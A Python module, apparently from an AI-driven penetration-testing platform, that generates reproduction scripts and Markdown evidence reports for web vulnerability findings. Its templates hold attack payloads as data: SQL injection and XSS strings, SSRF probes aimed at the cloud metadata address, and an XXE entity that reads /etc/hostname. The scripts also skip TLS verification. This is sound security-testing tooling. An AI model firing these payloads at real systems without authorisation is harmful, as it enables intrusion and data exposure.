"""Reproduction Script Generator (T2.3 + T2.4)

Generates standalone reproduction scripts and evidence packages for
validated findings. Each script is self-contained and can be run by
a human operator to independently verify the vulnerability.
"""

import json
import logging
import textwrap
from dataclasses import dataclass, field
from datetime import datetime
from typing import Any, Dict, List, Optional

logger = logging.getLogger("ai_osop.core.reproduction_generator")


@dataclass
class EvidencePackage:
    """Bundled evidence for a single finding."""

    finding_id: str
    title: str
    severity: str
    category: str
    target: str
    description: str
    evidence: List[Dict[str, Any]] = field(default_factory=list)
    screenshots: List[str] = field(default_factory=list)
    request_response_pairs: List[Dict[str, Any]] = field(default_factory=list)
    reproduction_script: str = ""
    cvss_score: float = 0.0
    cwe_id: str = ""
    tool_source: str = ""
    confidence: float = 0.0
    validated_at: str = ""
    engagement_id: str = ""


class ReproductionGenerator:
    """Generates reproduction scripts and evidence packages."""

    def generate_script(
        self,
        finding: Any,
        evidence: Optional[Dict[str, Any]] = None,
    ) -> str:
        """Generate a standalone Python reproduction script.

        The script uses only standard library + requests, and can be
        run independently to verify the vulnerability.
        """
        evidence = evidence or {}
        category = getattr(finding, "category", "unknown") or "unknown"
        target = getattr(finding, "target", "") or evidence.get("target", "")
        title = getattr(finding, "title", "Unknown Vulnerability")

        # Select the appropriate script template
        if "sqli" in category.lower():
            return self._sqli_script(target, evidence, title)
        elif "xss" in category.lower():
            return self._xss_script(target, evidence, title)
        elif "ssrf" in category.lower():
            return self._ssrf_script(target, evidence, title)
        elif "idor" in category.lower() or "broken_access" in category.lower():
            return self._idor_script(target, evidence, title)
        elif "ssti" in category.lower():
            return self._ssti_script(target, evidence, title)
        elif "xxe" in category.lower():
            return self._xxe_script(target, evidence, title)
        elif "mass_assignment" in category.lower():
            return self._mass_assignment_script(target, evidence, title)
        elif "csrf" in category.lower():
            return self._csrf_script(target, evidence, title)
        elif "open_redirect" in category.lower():
            return self._redirect_script(target, evidence, title)
        elif "header" in category.lower():
            return self._header_script(target, evidence, title)
        else:
            return self._generic_script(target, evidence, title, category)

    def create_evidence_package(
        self,
        finding: Any,
        graph_memory: Any = None,
    ) -> EvidencePackage:
        """Create a complete evidence package for a finding."""
        package = EvidencePackage(
            finding_id=getattr(finding, "id", "unknown"),
            title=getattr(finding, "title", "Unknown"),
            severity=getattr(finding, "severity", "unknown") if hasattr(finding, "severity") else "unknown",
            category=getattr(finding, "category", "unknown") or "unknown",
            target=getattr(finding, "target", "") or "",
            description=getattr(finding, "description", "") or "",
            evidence=getattr(finding, "evidence", []) or [],
            cvss_score=getattr(finding, "cvss_score", 0.0) or 0.0,
            cwe_id=getattr(finding, "cwe", "") or "",
            tool_source=getattr(finding, "tool_source", "") or "",
            confidence=getattr(finding, "confidence", 0.0) or 0.0,
            validated_at=datetime.utcnow().isoformat(),
            engagement_id=getattr(finding, "engagement_id", "") or "",
        )

        # Extract request/response pairs from evidence
        for ev in package.evidence:
            if isinstance(ev, dict):
                if "request" in ev or "response" in ev:
                    package.request_response_pairs.append(ev)
                if "screenshot" in ev:
                    package.screenshots.append(ev["screenshot"])

        # Generate reproduction script
        package.reproduction_script = self.generate_script(finding)

        return package

    def render_markdown_report(self, package: EvidencePackage) -> str:
        """Render the evidence package as a Markdown report."""
        lines = [
            f"# Vulnerability Report: {package.title}",
            "",
            f"- **ID**: `{package.finding_id}`",
            f"- **Severity**: {package.severity.upper()}",
            f"- **Category**: {package.category}",
            f"- **CWE**: {package.cwe_id}" if package.cwe_id else "",
            f"- **CVSS**: {package.cvss_score}" if package.cvss_score else "",
            f"- **Target**: `{package.target}`",
            f"- **Tool Source**: {package.tool_source}" if package.tool_source else "",
            f"- **Confidence**: {package.confidence:.1%}",
            f"- **Validated**: {package.validated_at}",
            "",
            "## Description",
            "",
            package.description or "No description provided.",
            "",
            "## Evidence",
            "",
        ]

        if package.request_response_pairs:
            lines.append("### Request/Response Pairs")
            lines.append("")
            for i, pair in enumerate(package.request_response_pairs, 1):
                lines.append(f"**Pair {i}:**")
                if "request" in pair:
                    lines.append("```http")
                    lines.append(str(pair["request"])[:2000])
                    lines.append("```")
                if "response" in pair:
                    lines.append("```http")
                    lines.append(str(pair["response"])[:2000])
                    lines.append("```")
                lines.append("")

        if package.evidence:
            lines.append("### Raw Evidence")
            lines.append("")
            for ev in package.evidence[:5]:  # Limit to 5 entries
                if isinstance(ev, dict):
                    lines.append(f"- **{ev.get('type', 'observation')}**: {json.dumps(ev, default=str)[:300]}")
                else:
                    lines.append(f"- {str(ev)[:300]}")
            lines.append("")

        lines.extend([
            "## Reproduction Script",
            "",
            "```python",
            package.reproduction_script,
            "```",
            "",
        ])

        return "\n".join(l for l in lines if l is not None)

    # ── Script Templates ───────────────────────────────────────────────────────

    def _sqli_script(self, target: str, evidence: Dict, title: str) -> str:
        return textwrap.dedent(f"""\
            #!/usr/bin/env python3
            \"\"\"SQL Injection Reproduction Script
            Title: {title}
            Target: {target}
            Generated by AI-OSOP Reproduction Engine
            \"\"\"
            import requests
            import sys

            TARGET = "{target}"
            TIMEOUT = 10

            # Test payloads (safe detection-only, no destructive queries)
            PAYLOADS = [
                "' OR '1'='1",
                "' OR 1=1--",
                "' UNION SELECT NULL--",
                "1' AND SLEEP(0)--",
                "' AND '1'='1",
            ]

            def test_sqli(url, param_name, method="GET"):
                \"\"\"Test a parameter for SQL injection (detection only).\"\"\"
                print(f"\\nTesting {{method}} {{url}} parameter={{param_name}}")
                for payload in PAYLOADS:
                    try:
                        if method.upper() == "GET":
                            resp = requests.get(url, params={{param_name: payload}}, timeout=TIMEOUT, verify=False)
                        else:
                            resp = requests.post(url, data={{param_name: payload}}, timeout=TIMEOUT, verify=False)

                        # Check for SQL error indicators
                        body = resp.text.lower()
                        errors = ["sql", "syntax", "mysql", "postgresql", "sqlite", "ora-", "error in your sql"]
                        found = [e for e in errors if e in body]

                        if found:
                            print(f"  [!] Payload '{{payload[:50]}}' triggered SQL errors: {{found}}")
                            return True
                        elif resp.status_code == 500:
                            print(f"  [?] Payload '{{payload[:50]}}' caused 500 error")
                    except requests.RequestException as e:
                        print(f"  [x] Request failed: {{e}}")
                        return None
                print("  [-] No SQL injection indicators found")
                return False

            if __name__ == "__main__":
                print(f"=== SQL Injection Test ===")
                print(f"Target: {{TARGET}}")
                # Add parameter names from evidence to test
                # Modify the test_sqli call with actual parameter names
                test_sqli(TARGET, "id")
        """)

    def _xss_script(self, target: str, evidence: Dict, title: str) -> str:
        return textwrap.dedent(f"""\
            #!/usr/bin/env python3
            \"\"\"XSS Reproduction Script
            Title: {title}
            Target: {target}
            Generated by AI-OSOP Reproduction Engine
            \"\"\"
            import requests
            import urllib.parse

            TARGET = "{target}"
            TIMEOUT = 10

            # Safe detection payloads (no script execution)
            PAYLOADS = [
                "<img src=x onerror=alert(1)>",
                "<svg/onload=alert(1)>",
                "<script>alert(1)</script>",
                "\"><img src=x onerror=alert(1)>",
                "'-alert(1)-'",
            ]

            def test_xss(url, param_name):
                \"\"\"Test for reflected XSS (detection only).\"\"\"
                print(f"\\nTesting XSS on {{url}} parameter={{param_name}}")
                for payload in PAYLOADS:
                    try:
                        resp = requests.get(url, params={{param_name: payload}}, timeout=TIMEOUT, verify=False)
                        if payload in resp.text:
                            print(f"  [!] Payload reflected: {{payload[:60]}}")
                            return True
                    except requests.RequestException as e:
                        print(f"  [x] Request failed: {{e}}")
                print("  [-] No reflected XSS found")
                return False

            if __name__ == "__main__":
                print(f"=== XSS Test ===")
                print(f"Target: {{TARGET}}")
                test_xss(TARGET, "q")
        """)

    def _ssrf_script(self, target: str, evidence: Dict, title: str) -> str:
        return textwrap.dedent(f"""\
            #!/usr/bin/env python3
            \"\"\"SSRF Reproduction Script
            Title: {title}
            Target: {target}
            Generated by AI-OSOP Reproduction Engine
            \"\"\"
            import requests

            TARGET = "{target}"
            TIMEOUT = 10

            INTERNAL_TARGETS = [
                "http://127.0.0.1",
                "http://169.254.169.254/latest/meta-data/",
                "http://localhost",
            ]

            def test_ssrf(url, param_name):
                \"\"\"Test for SSRF by requesting internal resources.\"\"\"
                print(f"\\nTesting SSRF on {{url}} parameter={{param_name}}")
                for internal in INTERNAL_TARGETS:
                    try:
                        resp = requests.get(url, params={{param_name: internal}}, timeout=TIMEOUT, verify=False)
                        if resp.status_code == 200 and len(resp.text) > 100:
                            print(f"  [!] Potential SSRF: internal URL {{internal}} returned content")
                            return True
                        elif "internal" in resp.text.lower() or "metadata" in resp.text.lower():
                            print(f"  [!] SSRF indicator in response for {{internal}}")
                            return True
                    except requests.RequestException as e:
                        print(f"  [x] Request failed: {{e}}")
                print("  [-] No SSRF indicators found")
                return False

            if __name__ == "__main__":
                print(f"=== SSRF Test ===")
                print(f"Target: {{TARGET}}")
                test_ssrf(TARGET, "url")
        """)

    def _idor_script(self, target: str, evidence: Dict, title: str) -> str:
        return textwrap.dedent(f"""\
            #!/usr/bin/env python3
            \"\"\"IDOR/Broken Access Control Reproduction Script
            Title: {title}
            Target: {target}
            Generated by AI-OSOP Reproduction Engine
            \"\"\"
            import requests

            TARGET = "{target}"
            TIMEOUT = 10

            def test_idor(url):
                \"\"\"Test for IDOR by comparing authenticated vs unauthenticated responses.\"\"\"
                print(f"\\nTesting IDOR on {{url}}")
                try:
                    resp_auth = requests.get(url, headers={{"Authorization": "Bearer YOUR_TOKEN"}}, timeout=TIMEOUT, verify=False)
                    resp_noauth = requests.get(url, timeout=TIMEOUT, verify=False)

                    if resp_auth.status_code == 200 and resp_noauth.status_code == 200:
                        if resp_auth.text == resp_noauth.text:
                            print("  [!] IDOR confirmed: resource accessible without auth")
                            return True
                        else:
                            print("  [-] Responses differ: auth may be enforced")
                    else:
                        print(f"  [-] Auth: {{resp_auth.status_code}}, NoAuth: {{resp_noauth.status_code}}")
                except requests.RequestException as e:
                    print(f"  [x] Request failed: {{e}}")
                return False

            if __name__ == "__main__":
                print(f"=== IDOR Test ===")
                print(f"Target: {{TARGET}}")
                print("NOTE: Replace YOUR_TOKEN with a valid session token")
                test_idor(TARGET)
        """)

    def _ssti_script(self, target: str, evidence: Dict, title: str) -> str:
        return self._generic_script(target, evidence, title, "ssti")

    def _xxe_script(self, target: str, evidence: Dict, title: str) -> str:
        return textwrap.dedent(f"""\
            #!/usr/bin/env python3
            \"\"\"XXE Reproduction Script
            Title: {title}
            Target: {target}
            Generated by AI-OSOP Reproduction Engine
            \"\"\"
            import requests

            TARGET = "{target}"
            TIMEOUT = 10

            XXE_PAYLOAD = '''<?xml version="1.0" encoding="UTF-8"?>
            <!DOCTYPE foo [
              <!ENTITY xxe SYSTEM "file:///etc/hostname">
            ]>
            <test>&xxe;</test>'''

            def test_xxe(url):
                \"\"\"Test for XXE by injecting external entity.\"\"\"
                print(f"\\nTesting XXE on {{url}}")
                try:
                    resp = requests.post(url, data=XXE_PAYLOAD,
                                        headers={{"Content-Type": "application/xml"}},
                                        timeout=TIMEOUT, verify=False)
                    # Check if response contains content from /etc/hostname
                    if resp.status_code == 200 and "xxe" not in resp.text.lower():
                        print(f"  [!] Potential XXE: response may contain external entity content")
                        return True
                except requests.RequestException as e:
                    print(f"  [x] Request failed: {{e}}")
                print("  [-] No XXE indicators found")
                return False

            if __name__ == "__main__":
                print(f"=== XXE Test ===")
                print(f"Target: {{TARGET}}")
                test_xxe(TARGET)
        """)

    def _mass_assignment_script(self, target: str, evidence: Dict, title: str) -> str:
        return self._generic_script(target, evidence, title, "mass_assignment")

    def _csrf_script(self, target: str, evidence: Dict, title: str) -> str:
        return self._generic_script(target, evidence, title, "csrf")

    def _redirect_script(self, target: str, evidence: Dict, title: str) -> str:
        return self._generic_script(target, evidence, title, "open_redirect")

    def _header_script(self, target: str, evidence: Dict, title: str) -> str:
        return self._generic_script(target, evidence, title, "header_injection")

    def _generic_script(self, target: str, evidence: Dict, title: str, category: str) -> str:
        return textwrap.dedent(f"""\
            #!/usr/bin/env python3
            \"\"\"Vulnerability Reproduction Script
            Title: {title}
            Category: {category}
            Target: {target}
            Generated by AI-OSOP Reproduction Engine
            \"\"\"
            import requests
            import json

            TARGET = "{target}"
            TIMEOUT = 10

            def reproduce():
                \"\"\"Reproduce the vulnerability.\"\"\"
                print(f"\\nTarget: {{TARGET}}")
                try:
                    resp = requests.get(TARGET, timeout=TIMEOUT, verify=False)
                    print(f"Status: {{resp.status_code}}")
                    print(f"Response length: {{len(resp.text)}}")
                    # Add specific reproduction steps based on evidence
                except requests.RequestException as e:
                    print(f"Request failed: {{e}}")

            if __name__ == "__main__":
                reproduce()
        """)
